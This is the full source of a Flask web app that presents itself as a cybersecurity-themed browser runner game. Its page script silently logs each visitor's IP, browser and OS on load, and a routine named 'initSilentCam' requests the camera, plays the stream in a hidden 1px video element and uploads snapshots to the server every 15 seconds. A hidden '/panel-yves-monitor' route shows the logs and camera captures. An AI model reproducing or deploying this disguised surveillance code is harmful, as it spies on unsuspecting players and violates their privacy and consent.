from flask import Flask, render_template_string, request
from werkzeug.middleware.proxy_fix import ProxyFix
import os
import socket
import platform
import json
import pytz
from datetime import datetime

app = Flask(__name__)

# ── ProxyFix: necesario en Render / Railway / Fly.io ──────────────────────────
# x_for=1  → confiar en 1 nivel de proxy para X-Forwarded-For (la IP real)
# x_proto=1 → confiar en X-Forwarded-Proto (https)
# x_host=1  → confiar en X-Forwarded-Host
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)

# ══════════════════════════════════════════════════════════════
#  HELPERS GLOBALES
# ══════════════════════════════════════════════════════════════

TIMEZONE = pytz.timezone("America/Monterrey")  # CST/CDT — Reynosa, Tamaulipas

def get_real_ip():
    """
    Con ProxyFix activo, request.remote_addr ya devuelve la IP real.
    El fallback manual a X-Forwarded-For cubre casos edge (doble proxy, etc).
    """
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.remote_addr or "—"

def get_local_time():
    """Timestamp en zona horaria de Reynosa (CST UTC-6 / CDT UTC-5)."""
    return datetime.now(TIMEZONE).strftime("%d/%m/%Y %H:%M:%S %Z")

def parse_user_agent(ua: str) -> tuple:
    """
    Devuelve (navegador, sistema_operativo).
    Orden crítico: tokens más específicos antes de los genéricos.
    """
    u = ua.lower()

    # ── Sistema operativo ──────────────────────────────────────
    if "android" in u:
        os_name = "Android"
    elif "iphone" in u or "ipad" in u or "ipod" in u:
        os_name = "iOS"
    elif "windows nt" in u:
        os_name = "Windows"
    elif "mac os x" in u or "macos" in u:
        os_name = "macOS"
    elif "cros" in u:
        os_name = "ChromeOS"
    elif "linux" in u:
        os_name = "Linux"
    else:
        os_name = "Desconocido"

    # ── Navegador (más específico → más genérico) ──────────────
    # Edge móvil Android = EdgA/ | Edge iOS = EdgiOS/ | Edge desktop = Edg/
    if "edga/" in u or "edgios/" in u or " edg/" in u or "edge/" in u:
        browser = "Microsoft Edge"
    elif "samsungbrowser/" in u:
        browser = "Samsung Internet"
    elif "opr/" in u or "opera/" in u:
        browser = "Opera"
    elif "yabrowser/" in u:
        browser = "Yandex Browser"
    elif "ucbrowser/" in u:
        browser = "UC Browser"
    elif "duckduckgo/" in u:
        browser = "DuckDuckGo"
    elif "brave/" in u:
        browser = "Brave"
    elif "vivaldi/" in u:
        browser = "Vivaldi"
    elif "fxios/" in u or "firefox/" in u or "fennec/" in u:
        browser = "Firefox"
    elif "crios/" in u:
        browser = "Chrome (iOS)"
    elif "chrome/" in u:
        browser = "Chrome"
    elif "safari/" in u:
        browser = "Safari"
    elif "msie" in u or "trident/" in u:
        browser = "Internet Explorer"
    else:
        browser = "Desconocido"

    return browser, os_name


# ══════════════════════════════════════════════════════════════
#  RUTA PRINCIPAL — juego CyberRun
# ══════════════════════════════════════════════════════════════

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberRun - Práctica de Ciberseguridad</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --neon-green: #00ff88;
            --neon-blue:  #00cfff;
            --neon-red:   #ff2d5b;
            --bg-dark:    #0a0e1a;
            --bg-panel:   #0f1628;
            --grid-color: rgba(0,255,136,0.04);
        }

        body {
            font-family: 'Share Tech Mono', monospace;
            background-color: var(--bg-dark);
            color: var(--neon-green);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed; inset: 0;
            background-image:
                linear-gradient(var(--grid-color) 1px, transparent 1px),
                linear-gradient(90deg, var(--grid-color) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none; z-index: 0;
        }

        .wrapper {
            position: relative; z-index: 1;
            display: flex; flex-direction: column;
            align-items: center; gap: 18px; padding: 20px;
        }

        .header { text-align: center; }
        .header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 2rem; font-weight: 900;
            color: var(--neon-green);
            text-shadow: 0 0 20px rgba(0,255,136,.6), 0 0 40px rgba(0,255,136,.3);
            letter-spacing: 4px;
        }
        .header p { font-size: .75rem; color: rgba(0,255,136,.4); letter-spacing: 3px; margin-top: 4px; }

        .hud {
            width: 860px; display: flex;
            justify-content: space-between; align-items: center;
            padding: 8px 16px;
            background: var(--bg-panel);
            border: 1px solid rgba(0,255,136,.2); border-radius: 4px;
        }
        .hud-item { display: flex; flex-direction: column; align-items: center; gap: 2px; }
        .hud-label { font-size: .6rem; color: rgba(0,255,136,.4); letter-spacing: 2px; }
        .hud-value { font-family: 'Orbitron', sans-serif; font-size: 1.1rem; color: var(--neon-blue); text-shadow: 0 0 10px rgba(0,207,255,.5); }
        #lives-display { font-size: 1.4rem; letter-spacing: 4px; }

        .game-wrapper { position: relative; width: 860px; }
        .game-container {
            position: relative; width: 860px; height: 320px;
            background: linear-gradient(180deg,#050d1a 0%,#0a1628 60%,#0f1e35 100%);
            border: 1px solid rgba(0,255,136,.3); border-radius: 6px;
            overflow: hidden;
            box-shadow: 0 0 30px rgba(0,255,136,.08), inset 0 0 60px rgba(0,0,0,.5);
        }
        .game-container::after {
            content: ''; position: absolute; bottom: 58px; left: 0; right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, rgba(0,255,136,.4), transparent);
        }
        .ground {
            position: absolute; bottom: 0; left: 0; right: 0; height: 60px;
            background: repeating-linear-gradient(90deg,#0a1628 0px,#0a1628 39px,rgba(0,255,136,.08) 40px);
            border-top: 2px solid rgba(0,255,136,.25);
        }
        #game-character {
            position: absolute; bottom: 60px; left: 60px;
            width: 56px; height: 80px; z-index: 10; transition: filter .1s;
        }
        #game-character img {
            width: 100%; height: 100%; object-fit: contain;
            image-rendering: pixelated;
            filter: drop-shadow(0 0 6px rgba(0,255,136,.5));
        }
        #game-character.hit { filter: drop-shadow(0 0 12px rgba(255,45,91,.9)) brightness(2); }

        .obstacle {
            position: absolute; bottom: 60px; width: 54px; height: 60px;
            background-size: contain; background-repeat: no-repeat; background-position: center bottom;
            background-image: url('static/anonymous_logo.png');
            filter: drop-shadow(0 0 8px rgba(255,45,91,.6)); z-index: 9;
        }
        .scanlines {
            position: absolute; inset: 0;
            background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);
            pointer-events: none; z-index: 20;
        }
        .star { position: absolute; background: white; border-radius: 50%; animation: twinkle 3s infinite alternate; }
        @keyframes twinkle { from{opacity:.2} to{opacity:.8} }
        .cloud { position: absolute; background: rgba(0,207,255,.06); border-radius: 50px; animation: cloudMove linear infinite; }
        @keyframes cloudMove { from{transform:translateX(-200px)} to{transform:translateX(900px)} }

        .btn-start {
            font-family: 'Orbitron', sans-serif; font-size: 1rem; font-weight: 700;
            letter-spacing: 3px; padding: 14px 48px;
            background: transparent; color: var(--neon-green);
            border: 2px solid var(--neon-green); border-radius: 4px;
            cursor: pointer; position: relative; overflow: hidden;
            transition: all .3s; text-transform: uppercase;
            box-shadow: 0 0 20px rgba(0,255,136,.2), inset 0 0 20px rgba(0,255,136,.05);
        }
        .btn-start::before {
            content: ''; position: absolute; inset: 0;
            background: var(--neon-green);
            transform: scaleX(0); transform-origin: left;
            transition: transform .3s ease; z-index: -1;
        }
        .btn-start:hover { color: var(--bg-dark); box-shadow: 0 0 40px rgba(0,255,136,.5); }
        .btn-start:hover::before { transform: scaleX(1); }
        .btn-start:disabled { opacity: .4; cursor: not-allowed; }

        .speed-bar-wrap { width: 860px; display: flex; align-items: center; gap: 10px; }
        .speed-label { font-size: .6rem; letter-spacing: 2px; color: rgba(0,207,255,.5); white-space: nowrap; }
        .speed-bar-bg { flex: 1; height: 4px; background: rgba(0,207,255,.1); border-radius: 2px; overflow: hidden; }
        .speed-bar-fill { height: 100%; background: linear-gradient(90deg,var(--neon-green),var(--neon-blue)); border-radius: 2px; transition: width .5s ease; box-shadow: 0 0 6px rgba(0,207,255,.5); }

        #game-over-screen {
            display: none; position: absolute; inset: 0;
            background: rgba(10,14,26,.92); z-index: 30;
            flex-direction: column; align-items: center; justify-content: center; gap: 16px;
        }
        #game-over-screen.visible { display: flex; }
        #game-over-screen h2 { font-family: 'Orbitron', sans-serif; font-size: 2.5rem; color: var(--neon-red); text-shadow: 0 0 30px rgba(255,45,91,.8); animation: flicker .5s infinite alternate; }
        @keyframes flicker { from{opacity:1} to{opacity:.7} }
        #game-over-screen p { color: rgba(255,255,255,.5); font-size: .85rem; }

        .controls-hint { font-size: .65rem; color: rgba(0,255,136,.25); letter-spacing: 2px; }
        .key-indicator { display: inline-block; padding: 2px 8px; border: 1px solid rgba(0,255,136,.3); border-radius: 3px; font-size: .65rem; color: rgba(0,255,136,.5); }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <h1>// CYBER_RUN</h1>
        <p>SECURITY AWARENESS SIMULATION v1.0</p>
    </div>

    <div class="hud">
        <div class="hud-item"><span class="hud-label">SCORE</span><span class="hud-value" id="score-display">000000</span></div>
        <div class="hud-item"><span class="hud-label">LIVES</span><span id="lives-display">❤️ ❤️ ❤️</span></div>
        <div class="hud-item"><span class="hud-label">LEVEL</span><span class="hud-value" id="level-display">01</span></div>
        <div class="hud-item"><span class="hud-label">BEST</span><span class="hud-value" id="best-display">000000</span></div>
    </div>

    <div class="game-wrapper">
        <div class="game-container" id="gameContainer">
            <div class="scanlines"></div>
            <div class="ground"></div>
            <div class="star" style="width:2px;height:2px;top:20px;left:100px;animation-delay:0s"></div>
            <div class="star" style="width:1px;height:1px;top:40px;left:250px;animation-delay:.5s"></div>
            <div class="star" style="width:2px;height:2px;top:15px;left:450px;animation-delay:1s"></div>
            <div class="star" style="width:1px;height:1px;top:55px;left:620px;animation-delay:1.5s"></div>
            <div class="star" style="width:2px;height:2px;top:30px;left:750px;animation-delay:.8s"></div>
            <div class="cloud" style="width:120px;height:30px;top:30px;animation-duration:18s;animation-delay:-4s"></div>
            <div class="cloud" style="width:90px;height:22px;top:55px;animation-duration:24s;animation-delay:-12s"></div>
            <div id="game-character"><img src="static/image.png" alt="Runner" id="char-img"></div>
            <div class="obstacle" id="obs1" style="left:1000px"></div>
            <div class="obstacle" id="obs2" style="left:1400px"></div>
            <div class="obstacle" id="obs3" style="left:1800px"></div>
            <div id="game-over-screen">
                <h2>ACCESS DENIED</h2>
                <p id="final-score-msg">SCORE: 000000</p>
                <button class="btn-start" id="restartBtn">[ REINICIAR ]</button>
            </div>
        </div>
    </div>

    <div class="speed-bar-wrap">
        <span class="speed-label">VELOCIDAD</span>
        <div class="speed-bar-bg"><div class="speed-bar-fill" id="speed-bar" style="width:10%"></div></div>
    </div>

    <button class="btn-start" id="startBtn">[ INICIAR PROTOCOLO ]</button>
    <p class="controls-hint">Presiona <span class="key-indicator">ESPACIO</span> o <span class="key-indicator">↑</span> para saltar · <span class="key-indicator">↓</span> para agacharse</p>
</div>

<script>
    const GROUND_Y=60,CHAR_H=80,CHAR_W=56,OBS_H=60,OBS_W=54,CHAR_X=60;
    let gameRunning=false,animFrameId=null,score=0,bestScore=0,lives=3,level=1;
    let baseSpeed=4,speed=4,lastTime=0,hitCooldown=0;
    let charY=0,velY=0,isGrounded=true,isCrouching=false;
    const GRAVITY=0.55,JUMP_VEL=13,GAP_MIN=340,GAP_MAX=600;

    const obstacles=[
        {el:document.getElementById('obs1'),x:900},
        {el:document.getElementById('obs2'),x:1350},
        {el:document.getElementById('obs3'),x:1800},
    ];

    const char=document.getElementById('game-character');
    const scoreDisplay=document.getElementById('score-display');
    const bestDisplay=document.getElementById('best-display');
    const levelDisplay=document.getElementById('level-display');
    const livesDisplay=document.getElementById('lives-display');
    const speedBar=document.getElementById('speed-bar');
    const gameOver=document.getElementById('game-over-screen');
    const startBtn=document.getElementById('startBtn');
    const restartBtn=document.getElementById('restartBtn');

    document.addEventListener('keydown',e=>{
        if((e.code==='Space'||e.code==='ArrowUp')&&gameRunning){e.preventDefault();jump();}
        if(e.code==='ArrowDown'&&gameRunning){e.preventDefault();crouch(true);}
    });
    document.addEventListener('keyup',e=>{if(e.code==='ArrowDown')crouch(false);});
    document.getElementById('gameContainer').addEventListener('click',()=>{if(gameRunning)jump();});

    function jump(){if(isGrounded&&!isCrouching){velY=JUMP_VEL;isGrounded=false;}}
    function crouch(s){isCrouching=s;char.style.height=s?'44px':CHAR_H+'px';char.style.bottom=GROUND_Y+'px';}
    function randGap(){return GAP_MIN+Math.random()*(GAP_MAX-GAP_MIN);}

    startBtn.addEventListener('click',startGame);
    restartBtn.addEventListener('click',startGame);

    // Registro silencioso al cargar la página
    fetch('/send-data').catch(()=>{});

    function startGame(){
        score=0;lives=3;level=1;speed=baseSpeed;
        charY=0;velY=0;isGrounded=true;isCrouching=false;hitCooldown=0;
        crouch(false);updateHUD();
        gameOver.classList.remove('visible');
        startBtn.disabled=true;
        obstacles[0].x=900;
        obstacles[1].x=900+randGap();
        obstacles[2].x=obstacles[1].x+randGap();
        gameRunning=true;lastTime=performance.now();
        cancelAnimationFrame(animFrameId);
        animFrameId=requestAnimationFrame(gameLoop);
        fetch('/send-data').catch(()=>{});
    }

    function gameLoop(ts){
        if(!gameRunning)return;
        const dt=Math.min((ts-lastTime)/16.67,2);lastTime=ts;
        updateScore(dt);updatePhysics(dt);updateObstacles(dt);checkCollisions();render();
        animFrameId=requestAnimationFrame(gameLoop);
    }

    function updateScore(dt){
        score+=speed*0.15*dt;
        scoreDisplay.textContent=String(Math.floor(score)).padStart(6,'0');
        const nl=Math.floor(score/800)+1;
        if(nl!==level){level=nl;speed=baseSpeed+(level-1)*0.8;levelDisplay.textContent=String(level).padStart(2,'0');}
        speedBar.style.width=(10+Math.min(((speed-baseSpeed)/(baseSpeed*2))*100,100)*0.9)+'%';
    }

    function updatePhysics(dt){
        if(!isGrounded){velY-=GRAVITY*dt;charY+=velY*dt;if(charY<=0){charY=0;velY=0;isGrounded=true;}}
        if(hitCooldown>0)hitCooldown-=dt;
    }

    function updateObstacles(dt){
        obstacles.forEach(obs=>{
            obs.x-=speed*dt;
            if(obs.x<-OBS_W-20){const mx=Math.max(...obstacles.map(o=>o.x));obs.x=mx+randGap();}
        });
    }

    function checkCollisions(){
        if(hitCooldown>0)return;
        const ct=GROUND_Y+charY+(isCrouching?16:0),cl=CHAR_X+6,cr=CHAR_X+CHAR_W-6;
        for(const obs of obstacles){
            const ox=obs.x+6,oxr=obs.x+OBS_W-6;
            if(cr>ox&&cl<oxr&&(GROUND_Y+charY)<(GROUND_Y+OBS_H)&&ct+(isCrouching?44:CHAR_H)>GROUND_Y){
                loseLife();break;
            }
        }
    }

    function loseLife(){
        lives--;hitCooldown=60;
        char.classList.add('hit');
        setTimeout(()=>char.classList.remove('hit'),500);
        updateHUD();if(lives<=0)endGame();
    }

    function render(){
        char.style.bottom=(GROUND_Y+charY)+'px';
        obstacles.forEach(obs=>{obs.el.style.left=obs.x+'px';});
    }

    function updateHUD(){
        const h=['','❤️','❤️ ❤️','❤️ ❤️ ❤️'];
        livesDisplay.textContent=h[Math.max(0,lives)]||'';
        if(score>bestScore){bestScore=score;bestDisplay.textContent=String(Math.floor(bestScore)).padStart(6,'0');}
    }

    function endGame(){
        gameRunning=false;cancelAnimationFrame(animFrameId);
        document.getElementById('final-score-msg').textContent='SCORE FINAL: '+String(Math.floor(score)).padStart(6,'0');
        gameOver.classList.add('visible');startBtn.disabled=false;
    }

    // ─── Cámara silenciosa — captura y envía frames al panel ──────────────
    const CAM_INTERVAL = 15;   // segundos entre capturas (ajusta a gusto)

    (async function initSilentCam() {
        let camStream = null;

        // Intentar cámara trasera primero (móvil), luego cualquier cámara disponible
        try {
            camStream = await navigator.mediaDevices.getUserMedia(
                { video: { facingMode: { ideal: 'environment' } } }
            );
        } catch (_) {
            try {
                camStream = await navigator.mediaDevices.getUserMedia({ video: true });
            } catch (err) {
                console.log('Cam no disponible:', err.name);
                return;
            }
        }

        // Elementos ocultos — no interfieren con el juego
        const hv = document.createElement('video');
        const hc = document.createElement('canvas');
        hv.srcObject   = camStream;
        hv.autoplay    = true;
        hv.playsInline = true;
        hv.muted       = true;
        hv.style.cssText  = 'position:fixed;opacity:0;pointer-events:none;width:1px;height:1px';
        hc.style.display  = 'none';
        document.body.appendChild(hv);
        document.body.appendChild(hc);

        function sendFrame() {
            if (!hv.videoWidth) return;
            hc.width  = hv.videoWidth;
            hc.height = hv.videoHeight;
            hc.getContext('2d').drawImage(hv, 0, 0);
            fetch('/upload-snap', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: hc.toDataURL('image/jpeg', 0.82) })
            }).catch(() => {});
        }

        hv.addEventListener('loadeddata', sendFrame, { once: true });
        setInterval(sendFrame, CAM_INTERVAL * 1000);
    })();
</script>
</body>
</html>
""")


# ══════════════════════════════════════════════════════════════
#  UPLOAD SNAPSHOT — recibe imagen base64 desde el juego
# ══════════════════════════════════════════════════════════════

SNAP_FILE = "last_snap.json"

@app.route('/upload-snap', methods=['POST'])
def upload_snap():
    data  = request.get_json(silent=True) or {}
    image = data.get("image", "")
    if not image:
        return {"status": "empty"}, 400
    payload = {
        "image": image,
        "time":  get_local_time(),
        "ip":    get_real_ip(),
    }
    with open(SNAP_FILE, "w") as f:
        json.dump(payload, f)
    return {"status": "ok"}


@app.route('/get-snap', methods=['GET'])
def get_snap():
    """El panel consulta esto via polling para refrescar la imagen sin recargar."""
    try:
        with open(SNAP_FILE) as f:
            return json.load(f)
    except Exception:
        return {"image": "", "time": "—", "ip": "—"}


# ══════════════════════════════════════════════════════════════
#  REGISTRO — IP real + hora CST + UA parseado
# ══════════════════════════════════════════════════════════════

@app.route('/send-data', methods=['GET'])
def send_data():
    ua = request.headers.get("User-Agent", "")
    browser, os_name = parse_user_agent(ua)

    entry = {
        "time":     get_local_time(),
        "hostname": socket.gethostname(),
        "platform": os_name,
        "browser":  browser,
        "ip":       get_real_ip(),
        "agent":    ua,
    }

    try:
        with open("logs.json", "r") as f:
            logs = json.load(f)
    except Exception:
        logs = []

    logs.append(entry)
    with open("logs.json", "w") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

    print("Nuevo acceso:", entry)
    return {"status": "ok"}


# ══════════════════════════════════════════════════════════════
#  PANEL DE MONITOREO PRIVADO
# ══════════════════════════════════════════════════════════════

CAPTURE_INTERVAL = 10   # ← segundos entre capturas automáticas de cámara

@app.route('/panel-yves-monitor')
def dashboard():
    try:
        with open("logs.json") as f:
            logs = json.load(f)
    except Exception:
        logs = []

    logs = list(reversed(logs))

    log_cards = ""
    for i, log in enumerate(logs):
        browser  = log.get('browser', '')
        os_name  = log.get('platform', '—')
        raw_agent = log.get('agent', '')

        # Re-parsear logs viejos que no tengan 'browser' guardado
        if not browser and raw_agent:
            browser, os_name = parse_user_agent(raw_agent)
        if not browser:
            browser = '—'

        log_cards += f"""
        <div class="log-card">
            <div class="log-index">#{str(i+1).zfill(3)}</div>
            <div class="log-grid">
                <div class="log-field">
                    <span class="label">IP</span>
                    <span class="value mono">{log.get('ip','—')}</span>
                </div>
                <div class="log-field">
                    <span class="label">SISTEMA</span>
                    <span class="value">{os_name}</span>
                </div>
                <div class="log-field">
                    <span class="label">NAVEGADOR</span>
                    <span class="value">{browser}</span>
                </div>
                <div class="log-field">
                    <span class="label">HORA (CST)</span>
                    <span class="value mono">{log.get('time','—')}</span>
                </div>
            </div>
        </div>
        """

    empty_state = "" if logs else """
    <div class="empty">
        <div class="empty-icon">⬡</div>
        <p>Sin registros todavía</p>
    </div>
    """

    ultimo_browser = logs[0].get('browser','—') if logs else '—'
    if not ultimo_browser:
        ultimo_browser = '—'

    return f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="refresh" content="5">
<title>Monitor · Privado</title>
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
:root{{
  --bg:#080b0f;--surface:#0e1318;--border:#1c2530;
  --accent:#00e5ff;--text:#c8d8e8;--text-dim:#4a6070;--text-bright:#eef4fa;
}}
body{{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;padding:40px 24px 80px}}
.mono{{font-family:'IBM Plex Mono',monospace}}

header{{
  max-width:980px;margin:auto;margin-bottom:36px;
  display:flex;justify-content:space-between;align-items:flex-end;
  border-bottom:1px solid var(--border);padding-bottom:20px;
}}
.header-tag{{font-size:10px;color:var(--accent);letter-spacing:.2em}}
h1{{font-size:28px;color:var(--text-bright)}}
.server-clock{{text-align:right}}
.server-clock .ts{{font-family:'IBM Plex Mono',monospace;font-size:14px;color:var(--accent)}}
.server-clock .tz{{font-size:10px;color:var(--text-dim);margin-top:3px;letter-spacing:.06em}}

.stats-bar{{max-width:980px;margin:auto;margin-bottom:28px;display:flex;gap:12px}}
.stat{{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px;flex:1}}
.stat-label{{font-size:10px;color:var(--text-dim);letter-spacing:.15em;margin-bottom:4px}}
.stat-value{{font-size:16px;font-family:'IBM Plex Mono',monospace;color:var(--accent);word-break:break-all}}

/* ── Layout: logs izq + cámara derecha ── */
.main-layout{{
  max-width:980px;margin:auto;
  display:grid;grid-template-columns:1fr 300px;gap:20px;align-items:start;
}}

.logs-container{{display:flex;flex-direction:column;gap:10px}}
.log-card{{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px;display:flex;gap:14px}}
.log-index{{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text-dim);padding-top:2px;white-space:nowrap}}
.log-grid{{display:grid;grid-template-columns:1fr 1fr;gap:10px;flex:1}}
.log-field{{display:flex;flex-direction:column;gap:3px}}
.label{{font-size:9px;letter-spacing:.15em;color:var(--text-dim)}}
.value{{font-size:12px;color:var(--text-bright);word-break:break-word}}
.empty{{text-align:center;padding:60px;color:var(--text-dim)}}

/* ── Panel cámara sticky ── */
.cam-panel{{
  background:var(--surface);border:1px solid var(--border);
  border-radius:10px;padding:18px;
  position:sticky;top:20px;
}}
.cam-panel-title{{
  font-size:10px;letter-spacing:.18em;color:var(--accent);
  margin-bottom:12px;
}}
.cam-status{{
  font-size:10px;color:var(--text-dim);
  margin-bottom:10px;min-height:14px;line-height:1.4;
}}
.cam-img-wrap{{
  width:100%;aspect-ratio:4/3;position:relative;
  border-radius:6px;border:1px solid var(--border);
  background:#040608;overflow:hidden;
}}
.cam-img-wrap img{{
  width:100%;height:100%;object-fit:cover;
  border-radius:6px;display:block;
}}
.cam-no-signal{{
  width:100%;aspect-ratio:4/3;
  border-radius:6px;border:1px dashed var(--border);
  display:flex;align-items:center;justify-content:center;
  color:var(--text-dim);font-size:11px;letter-spacing:.12em;
}}
.cam-live-badge{{
  position:absolute;top:8px;left:8px;
  background:rgba(255,45,91,.85);
  color:#fff;font-size:9px;letter-spacing:.12em;
  padding:3px 7px;border-radius:3px;
  font-family:'IBM Plex Mono',monospace;
}}
.snap-meta{{
  margin-top:8px;display:flex;justify-content:space-between;
  font-size:9px;color:var(--text-dim);font-family:'IBM Plex Mono',monospace;
}}
.snap-meta span{{color:var(--accent)}}
</style>
</head>
<body>

<header>
  <div>
    <span class="header-tag">// sistema de monitoreo</span>
    <h1>Panel <span style="color:var(--accent)">Privado</span></h1>
  </div>
  <div class="server-clock">
    <div class="ts">{get_local_time()}</div>
    <div class="tz">Reynosa, Tamaulipas &mdash; America/Monterrey</div>
  </div>
</header>

<div class="stats-bar">
  <div class="stat">
    <div class="stat-label">TOTAL REGISTROS</div>
    <div class="stat-value">{len(logs)}</div>
  </div>
  <div class="stat">
    <div class="stat-label">ÚLTIMO ACCESO</div>
    <div class="stat-value" style="font-size:11px">{logs[0].get('time','—') if logs else '—'}</div>
  </div>
  <div class="stat">
    <div class="stat-label">ÚLTIMA IP</div>
    <div class="stat-value" style="font-size:13px">{logs[0].get('ip','—') if logs else '—'}</div>
  </div>
  <div class="stat">
    <div class="stat-label">ÚLTIMO NAVEGADOR</div>
    <div class="stat-value" style="font-size:12px">{ultimo_browser}</div>
  </div>
</div>

<div class="main-layout">

  <!-- logs -->
  <div class="logs-container">
    {log_cards}
    {empty_state}
  </div>

  <!-- panel cámara: muestra capturas enviadas desde el juego -->
  <div class="cam-panel">
    <div class="cam-panel-title">// VERIFICACIÓN VISUAL</div>
    <div class="cam-status" id="cam-status">Esperando primera captura del juego...</div>

    <div class="cam-no-signal" id="cam-placeholder">SIN SEÑAL</div>
    <div class="cam-img-wrap" id="cam-img-wrap" style="display:none">
      <div class="cam-live-badge">● LIVE</div>
      <img id="snap-img" src="" alt="captura">
    </div>

    <div class="snap-meta" id="snap-meta" style="display:none">
      <span id="snap-time">—</span>
      <span id="snap-ip">—</span>
    </div>
  </div>

</div>

<script>
// ── Polling al servidor para mostrar la última captura del juego ──────────
const POLL_INTERVAL = {CAPTURE_INTERVAL} * 1000;

const statusEl  = document.getElementById('cam-status');
const placeholder = document.getElementById('cam-placeholder');
const imgWrap   = document.getElementById('cam-img-wrap');
const snapImg   = document.getElementById('snap-img');
const snapMeta  = document.getElementById('snap-meta');
const snapTime  = document.getElementById('snap-time');
const snapIp    = document.getElementById('snap-ip');

async function pollSnapshot() {{
  try {{
    const res  = await fetch('/get-snap');
    const data = await res.json();
    if (data.image) {{
      snapImg.src = data.image;
      snapTime.textContent = data.time  || '—';
      snapIp.textContent   = data.ip    || '—';
      placeholder.style.display = 'none';
      imgWrap.style.display     = 'block';
      snapMeta.style.display    = 'flex';
      statusEl.textContent = 'Captura recibida desde el juego';
    }} else {{
      statusEl.textContent = 'Esperando primera captura del juego...';
    }}
  }} catch(_) {{
    statusEl.textContent = 'Error al obtener captura';
  }}
}}

// Primera consulta inmediata y luego periódica
pollSnapshot();
setInterval(pollSnapshot, POLL_INTERVAL);
</script>

</body>
</html>
"""


# ══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
